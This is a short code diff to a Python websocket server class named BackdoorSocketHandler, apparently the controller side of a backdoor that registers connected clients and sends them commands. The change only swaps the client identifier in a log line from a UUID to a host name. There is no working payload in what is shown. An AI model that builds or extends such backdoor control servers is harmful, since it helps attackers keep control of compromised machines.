@@ -112,7 +112,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
 
                 self.ID = BackdoorSocketHandler.ID_LASTEST
                 BackdoorSocketHandler.clients[self.ID] = self
-                print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.UUID + ')'
+                print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.HOST_NAME + ')'
                 BackdoorSocketHandler.ID_LASTEST += 1
 
     def control_to_client(self, json_obj):
